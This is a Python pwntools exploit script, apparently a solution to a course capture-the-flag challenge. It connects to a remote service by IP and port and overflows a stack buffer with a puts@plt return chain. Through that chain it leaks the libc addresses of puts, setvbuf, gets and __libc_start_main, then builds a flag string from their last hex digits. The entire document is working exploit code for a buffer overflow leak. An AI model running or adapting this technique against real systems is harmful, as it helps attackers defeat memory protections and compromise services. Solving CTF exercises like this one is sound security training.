from pwn import *

context.binary = './chall'
elf = context.binary

p = remote('152.118.201.241', 3017)

offset = 20

puts_plt = elf.plt['puts']
main = elf.symbols['main']

def leak(addr):
    payload = b"A"*offset
    payload += p32(puts_plt)
    payload += p32(main)
    payload += p32(addr)

    p.sendline(payload)

    data = p.recvuntil(b'\n', drop=True)
    p.recvuntil(b'good luck!\n')
    if len(data) == 0:
        return 0

    return u32(data[:4].ljust(4, b'\x00'))

# skip banner
p.recvuntil(b'good luck!\n')

puts_addr = leak(elf.got['puts'])
setvbuf_addr = leak(elf.got['setvbuf'])
gets_addr = leak(elf.got['gets'])
libc_start_main_addr = leak(elf.got['__libc_start_main'])

def last3(x):
    return hex(x)[-3:]

flag = f"CSCE604258{{{last3(puts_addr)}_{last3(setvbuf_addr)}_{last3(gets_addr)}_{last3(libc_start_main_addr)}}}"

print(flag)